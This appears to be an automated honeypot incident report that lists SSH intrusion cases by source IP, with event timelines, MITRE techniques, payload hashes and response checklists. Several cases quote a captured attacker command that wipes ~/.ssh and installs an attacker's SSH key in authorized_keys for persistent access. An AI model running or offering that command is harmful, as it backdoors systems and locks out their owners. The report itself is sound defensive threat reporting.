
**Recommended Actions:**
- [ ] Submit `43.156.124[.]237` to AbuseIPDB if not already reported
- [ ] Block `43.156.124[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17ca5edd91b5

| Field | Detail |
|---|---|
| **Source IP** | `103.190.7[.]203` |
| **First Seen** | 2026-10-25 01:02 |
| **Last Seen** | 2026-10-25 01:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 01:02:51` | `cowrie.session.connect` |
| `2026-10-25 01:02:51` | `cowrie.client.version` |
| `2026-10-25 01:02:51` | `cowrie.client.kex` |
| `2026-10-25 01:02:52` | `cowrie.login.success` |
| `2026-10-25 01:02:53` | `cowrie.session.params` |
| `2026-10-25 01:02:53` | `cowrie.command.input` |
| `2026-10-25 01:02:53` | `cowrie.command.failed` |
| `2026-10-25 01:02:54` | `cowrie.log.closed` |
| `2026-10-25 01:02:55` | `cowrie.session.params` |
| `2026-10-25 01:02:55` | `cowrie.command.input` |
| `2026-10-25 01:02:55` | `cowrie.session.file_download` |
| `2026-10-25 01:02:55` | `cowrie.log.closed` |
| `2026-10-25 01:02:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.190.7[.]203` to AbuseIPDB if not already reported
- [ ] Block `103.190.7[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-360f2e59b420

| Field | Detail |
|---|---|
| **Source IP** | `43.156.124[.]237` |
| **First Seen** | 2026-10-25 01:02 |
| **Last Seen** | 2026-10-25 01:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 01:02:53` | `cowrie.session.connect` |
| `2026-10-25 01:02:53` | `cowrie.client.version` |
| `2026-10-25 01:02:54` | `cowrie.client.kex` |
| `2026-10-25 01:02:55` | `cowrie.login.success` |
| `2026-10-25 01:02:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.156.124[.]237` to AbuseIPDB if not already reported
- [ ] Block `43.156.124[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9af139e8765

| Field | Detail |
|---|---|
| **Source IP** | `103.190.7[.]203` |
| **First Seen** | 2026-10-25 01:02 |
| **Last Seen** | 2026-10-25 01:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 01:02:55` | `cowrie.session.connect` |
| `2026-10-25 01:02:55` | `cowrie.client.version` |
| `2026-10-25 01:02:55` | `cowrie.client.kex` |
| `2026-10-25 01:02:57` | `cowrie.login.success` |
| `2026-10-25 01:02:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.190.7[.]203` to AbuseIPDB if not already reported
- [ ] Block `103.190.7[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15aee767be1b

| Field | Detail |
|---|---|
| **Source IP** | `79.143.45[.]75` |
| **First Seen** | 2026-10-25 01:03 |
| **Last Seen** | 2026-10-25 01:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 01:03:13` | `cowrie.session.connect` |
| `2026-10-25 01:03:13` | `cowrie.client.version` |
| `2026-10-25 01:03:13` | `cowrie.client.kex` |
| `2026-10-25 01:03:14` | `cowrie.login.success` |
| `2026-10-25 01:03:15` | `cowrie.session.params` |
| `2026-10-25 01:03:15` | `cowrie.command.input` |
| `2026-10-25 01:03:15` | `cowrie.command.failed` |
| `2026-10-25 01:03:15` | `cowrie.log.closed` |
| `2026-10-25 01:03:16` | `cowrie.session.params` |
| `2026-10-25 01:03:16` | `cowrie.command.input` |
| `2026-10-25 01:03:16` | `cowrie.session.file_download` |
| `2026-10-25 01:03:16` | `cowrie.log.closed` |
| `2026-10-25 01:03:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.143.45[.]75` to AbuseIPDB if not already reported
- [ ] Block `79.143.45[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca88308dbca2

| Field | Detail |
|---|---|
| **Source IP** | `79.143.45[.]75` |
| **First Seen** | 2026-10-25 01:03 |
| **Last Seen** | 2026-10-25 01:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 01:03:16` | `cowrie.session.connect` |
| `2026-10-25 01:03:16` | `cowrie.client.version` |
| `2026-10-25 01:03:16` | `cowrie.client.kex` |
| `2026-10-25 01:03:17` | `cowrie.login.success` |
| `2026-10-25 01:03:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.143.45[.]75` to AbuseIPDB if not already reported
- [ ] Block `79.143.45[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ade1641d17c

| Field | Detail |
|---|---|
| **Source IP** | `119.96.159[.]237` |
| **First Seen** | 2026-10-25 01:03 |
| **Last Seen** | 2026-10-25 01:08 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 01:03:26` | `cowrie.session.connect` |
| `2026-10-25 01:03:26` | `cowrie.client.version` |
| `2026-10-25 01:03:27` | `cowrie.client.kex` |
| `2026-10-25 01:03:28` | `cowrie.login.success` |
| `2026-10-25 01:03:29` | `cowrie.session.params` |
| `2026-10-25 01:03:29` | `cowrie.command.input` |
| `2026-10-25 01:03:29` | `cowrie.command.failed` |
| `2026-10-25 01:03:29` | `cowrie.log.closed` |
| `2026-10-25 01:08:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.96.159[.]237` to AbuseIPDB if not already reported
- [ ] Block `119.96.159[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6077f45998b4

| Field | Detail |
|---|---|
| **Source IP** | `81.69.248[.]69` |
| **First Seen** | 2026-10-25 01:05 |
| **Last Seen** | 2026-10-25 01:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 01:05:44` | `cowrie.session.connect` |
| `2026-10-25 01:05:44` | `cowrie.client.version` |
| `2026-10-25 01:05:45` | `cowrie.client.kex` |
| `2026-10-25 01:05:46` | `cowrie.login.success` |
| `2026-10-25 01:05:47` | `cowrie.session.params` |
| `2026-10-25 01:05:47` | `cowrie.command.input` |
| `2026-10-25 01:05:47` | `cowrie.command.failed` |
| `2026-10-25 01:05:47` | `cowrie.log.closed` |
| `2026-10-25 01:05:48` | `cowrie.session.params` |
| `2026-10-25 01:05:48` | `cowrie.command.input` |
| `2026-10-25 01:05:49` | `cowrie.session.file_download` |
| `2026-10-25 01:05:49` | `cowrie.log.closed` |
| `2026-10-25 01:05:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.69.248[.]69` to AbuseIPDB if not already reported
- [ ] Block `81.69.248[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97193805a061

| Field | Detail |
|---|---|
| **Source IP** | `81.69.248[.]69` |
| **First Seen** | 2026-10-25 01:05 |
| **Last Seen** | 2026-10-25 01:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 01:05:49` | `cowrie.session.connect` |
| `2026-10-25 01:05:49` | `cowrie.client.version` |
| `2026-10-25 01:05:49` | `cowrie.client.kex` |
| `2026-10-25 01:05:50` | `cowrie.login.success` |
| `2026-10-25 01:05:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.69.248[.]69` to AbuseIPDB if not already reported
- [ ] Block `81.69.248[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-727304a3a305

| Field | Detail |
|---|---|
| **Source IP** | `182.43.235[.]75` |
| **First Seen** | 2026-10-25 01:07 |
| **Last Seen** | 2026-10-25 01:12 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 01:07:13` | `cowrie.session.connect` |
| `2026-10-25 01:07:13` | `cowrie.client.version` |
| `2026-10-25 01:07:14` | `cowrie.client.kex` |
| `2026-10-25 01:07:14` | `cowrie.login.success` |
| `2026-10-25 01:12:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.43.235[.]75` to AbuseIPDB if not already reported
- [ ] Block `182.43.235[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b9e9de9ba44

| Field | Detail |
|---|---|
| **Source IP** | `101.43.1[.]215` |
| **First Seen** | 2026-10-25 01:10 |
| **Last Seen** | 2026-10-25 01:15 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 01:10:39` | `cowrie.session.connect` |
| `2026-10-25 01:10:39` | `cowrie.client.version` |
| `2026-10-25 01:10:40` | `cowrie.client.kex` |
| `2026-10-25 01:10:41` | `cowrie.login.success` |
| `2026-10-25 01:15:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.43.1[.]215` to AbuseIPDB if not already reported
- [ ] Block `101.43.1[.]215` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9076667032a2

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-25 01:14 |
| **Last Seen** | 2026-10-25 01:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 01:14:24` | `cowrie.session.connect` |
| `2026-10-25 01:14:24` | `cowrie.client.version` |
| `2026-10-25 01:14:24` | `cowrie.client.kex` |
| `2026-10-25 01:14:24` | `cowrie.login.success` |
| `2026-10-25 01:14:24` | `cowrie.direct-tcpip.request` |
| `2026-10-25 01:14:25` | `cowrie.direct-tcpip.data` |
| `2026-10-25 01:14:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf387775356b

| Field | Detail |
|---|---|
| **Source IP** | `78.128.112[.]74` |
| **First Seen** | 2026-10-25 01:30 |
| **Last Seen** | 2026-10-25 01:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo 'SSH check'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-25 01:30:39` | `cowrie.session.connect` |
| `2026-10-25 01:30:39` | `cowrie.client.version` |
| `2026-10-25 01:30:39` | `cowrie.client.kex` |
| `2026-10-25 01:30:41` | `cowrie.login.success` |
| `2026-10-25 01:30:42` | `cowrie.session.params` |
| `2026-10-25 01:30:42` | `cowrie.command.input` |
| `2026-10-25 01:30:42` | `cowrie.log.closed` |
| `2026-10-25 01:30:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.128.112[.]74` to AbuseIPDB if not already reported
- [ ] Block `78.128.112[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (335) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-acd25a20189d | HIGH | `45.78.202[.]217` | 2026-10-25 01:43 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-0c7c4353abdc | HIGH | `45.78.202[.]217` | 2026-10-25 01:44 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7e8e7c7f1fd0 | HIGH | `80.94.95[.]118` | 2026-10-25 01:47 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c7bafb8d6722 | HIGH | `195.239.97[.]254` | 2026-10-25 01:48 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b978ac22b3cb | HIGH | `195.239.97[.]254` | 2026-10-25 01:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3d8bc412848a | HIGH | `112.151.168[.]124` | 2026-10-25 01:50 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-5f2ebec6a401 | HIGH | `112.151.168[.]124` | 2026-10-25 01:50 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ebaf706a6c11 | HIGH | `202.165.28[.]182` | 2026-10-25 01:52 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3f0a395502a0 | HIGH | `202.165.28[.]182` | 2026-10-25 01:52 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6f80a906cc75 | HIGH | `101.36.125[.]72` | 2026-10-25 01:53 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7424a4a60d5f | HIGH | `101.36.125[.]72` | 2026-10-25 01:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ac9e65f5d449 | HIGH | `117.72.35[.]56` | 2026-10-25 01:54 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-90ee9f2d7411 | HIGH | `117.72.35[.]56` | 2026-10-25 01:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-971403adec24 | HIGH | `109.94.173[.]35` | 2026-10-25 01:55 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-dab11d4e4599 | HIGH | `109.94.173[.]35` | 2026-10-25 01:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f2c2693b1e81 | HIGH | `128.1.42[.]111` | 2026-10-25 01:55 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-89e5d85736cf | HIGH | `45.43.36[.]172` | 2026-10-25 01:55 | Y | 16 | 0 | `T1003.008 · T1021.004 · T1059.004` |
| IR-507fdec5211e | HIGH | `128.1.42[.]111` | 2026-10-25 01:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-dc0c0c660daf | HIGH | `109.160.32[.]162` | 2026-10-25 02:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-bfeda8f52ad2 | HIGH | `179.43.153[.]2` | 2026-10-25 02:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-dfe01ba33209 | HIGH | `80.94.95[.]118` | 2026-10-25 02:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-689e37809041 | HIGH | `176.53.159[.]196` | 2026-10-25 02:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-97708120b771 | HIGH | `176.65.149[.]4` | 2026-10-25 02:16 | Y | 0 | 0 | `T1078` |
| IR-08d2acfcba74 | HIGH | `176.65.149[.]4` | 2026-10-25 02:16 | Y | 4 | 0 | `T1078 · T1083` |
| IR-1b075c9da097 | HIGH | `193.112.192[.]91` | 2026-10-25 02:18 | Y | 0 | 0 | `T1078 · T1592` |
| IR-750f170ce536 | HIGH | `34.78.26[.]141` | 2026-10-25 02:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-949a9db393e4 | HIGH | `80.97.44[.]146` | 2026-10-25 03:00 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-143a097d6959 | HIGH | `80.97.44[.]146` | 2026-10-25 03:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-932f7797d407 | HIGH | `186.248.197[.]77` | 2026-10-25 03:01 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-046890898b69 | HIGH | `186.248.197[.]77` | 2026-10-25 03:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ea7baa9eccd0 | HIGH | `187.111.28[.]131` | 2026-10-25 03:02 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9cc248b8c265 | HIGH | `187.111.28[.]131` | 2026-10-25 03:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f8acc57cbc9a | HIGH | `180.180.242[.]201` | 2026-10-25 03:08 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ea2f9f7d86e7 | HIGH | `180.180.242[.]201` | 2026-10-25 03:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9d4c64d2c2c2 | HIGH | `179.51.153[.]37` | 2026-10-25 03:10 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7ef0915c5601 | HIGH | `179.51.153[.]37` | 2026-10-25 03:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6e6d536d2bb8 | HIGH | `106.13.48[.]117` | 2026-10-25 03:12 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ee04485b4205 | HIGH | `106.13.48[.]117` | 2026-10-25 03:12 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fd6594573a2a | HIGH | `197.199.224[.]52` | 2026-10-25 03:13 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-14670c80be8e | HIGH | `197.199.224[.]52` | 2026-10-25 03:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-653151b6888b | HIGH | `116.55.245[.]26` | 2026-10-25 03:20 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-febc4170e034 | HIGH | `118.145.237[.]236` | 2026-10-25 03:20 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-0e739e10dc62 | HIGH | `201.63.223[.]138` | 2026-10-25 03:20 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c92a930572c8 | HIGH | `201.63.223[.]138` | 2026-10-25 03:20 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b564a1693824 | HIGH | `118.145.237[.]236` | 2026-10-25 03:21 | Y | 0 | 0 | `T1078 · T1592` |
| IR-abe1ae893ab6 | HIGH | `116.55.245[.]26` | 2026-10-25 03:21 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d84b65221aff | HIGH | `157.245.244[.]221` | 2026-10-25 03:21 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-0506b99228a2 | HIGH | `157.245.244[.]221` | 2026-10-25 03:21 | Y | 0 | 0 | `T1078 · T1592` |
| IR-cada8f39fed4 | HIGH | `106.13.46[.]138` | 2026-10-25 03:23 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-de13a1bcae5b | HIGH | `202.184.148[.]229` | 2026-10-25 03:25 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c19a7ad3b962 | HIGH | `202.184.148[.]229` | 2026-10-25 03:25 | Y | 0 | 0 | `T1078 · T1592` |
| IR-34d978e15eaa | HIGH | `115.190.179[.]68` | 2026-10-25 03:31 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-8159f831cf6d | HIGH | `128.1.32[.]150` | 2026-10-25 03:41 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-24d52f8fa02d | HIGH | `128.1.32[.]150` | 2026-10-25 03:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0fc526c8d777 | HIGH | `45.150.36[.]39` | 2026-10-25 03:41 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-444146df5adc | HIGH | `45.150.36[.]39` | 2026-10-25 03:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1495cef2c48f | HIGH | `109.94.173[.]34` | 2026-10-25 03:42 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-34ae8d045cd8 | HIGH | `109.94.173[.]34` | 2026-10-25 03:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-136cc8ad0804 | HIGH | `152.32.182[.]41` | 2026-10-25 03:49 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7835669f3989 | HIGH | `152.32.182[.]41` | 2026-10-25 03:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5a36150dc0f9 | HIGH | `179.43.153[.]2` | 2026-10-25 04:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-d5ffc0ba6bf0 | HIGH | `45.10.175[.]77` | 2026-10-25 04:25 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ca062d6375f4 | HIGH | `64.225.72[.]42` | 2026-10-25 04:29 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d96c31b7c5be | HIGH | `64.225.72[.]42` | 2026-10-25 04:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-845e37c1fef7 | HIGH | `123.25.115[.]189` | 2026-10-25 04:30 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d9944435b8c7 | HIGH | `123.25.115[.]189` | 2026-10-25 04:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-35f5d5244418 | HIGH | `60.199.224[.]55` | 2026-10-25 04:31 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-47f111095ce0 | HIGH | `60.199.224[.]55` | 2026-10-25 04:31 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b0851cc43f6e | HIGH | `193.187.110[.]159` | 2026-10-25 04:34 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f4a79fa19b1c | HIGH | `103.89.136[.]111` | 2026-10-25 04:35 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2a1dead7045a | HIGH | `103.89.136[.]111` | 2026-10-25 04:35 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a782ce6260db | HIGH | `202.101.144[.]44` | 2026-10-25 04:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ec6ed17d0024 | HIGH | `180.93.59[.]8` | 2026-10-25 04:37 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-df2c643ae034 | HIGH | `180.93.59[.]8` | 2026-10-25 04:37 | Y | 0 | 0 | `T1078 · T1592` |
| IR-390d37ebf1bb | HIGH | `197.248.15[.]98` | 2026-10-25 04:41 | Y | 0 | 0 | `T1078 · T1105 · T1592` |
| IR-566086d241fc | HIGH | `106.75.226[.]5` | 2026-10-25 04:43 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2ba809a11f0a | HIGH | `106.75.226[.]5` | 2026-10-25 04:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0aa9731c0d53 | HIGH | `198.23.213[.]7` | 2026-10-25 04:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-679a2be61cc8 | HIGH | `130.12.180[.]51` | 2026-10-25 04:55 | Y | 1 | 2 | `T1021.004 · T1059.004 · T1078` |
| IR-e2514a974136 | HIGH | `138.226.239[.]233` | 2026-10-25 05:03 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5c51f7efcfd1 | HIGH | `124.174.19[.]195` | 2026-10-25 05:07 | Y | 0 | 0 | `T1078 · T1105 · T1592` |
| IR-8b1f0c5af4ad | HIGH | `80.94.95[.]116` | 2026-10-25 05:07 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2b43b1edf52d | HIGH | `78.128.112[.]74` | 2026-10-25 05:30 | Y | 1 | 0 | `T1078 · T1592` |
| IR-c2908e5d7c83 | HIGH | `138.226.239[.]234` | 2026-10-25 05:33 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e09f79658cd6 | HIGH | `80.94.95[.]118` | 2026-10-25 05:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-515cf87ff387 | HIGH | `80.94.95[.]115` | 2026-10-25 05:37 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5847059c11cf | HIGH | `185.158.22[.]150` | 2026-10-25 05:39 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a34bff1ccdc7 | HIGH | `185.158.22[.]150` | 2026-10-25 05:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-149f1dad0a87 | HIGH | `34.156.222[.]77` | 2026-10-25 05:40 | Y | 2 | 0 | `T1078` |
| IR-cd36cbfaf74a | HIGH | `34.156.222[.]77` | 2026-10-25 05:41 | Y | 1 | 0 | `T1078` |
| IR-3f7d0793b2d6 | HIGH | `34.156.222[.]77` | 2026-10-25 05:41 | Y | 0 | 0 | `T1078` |
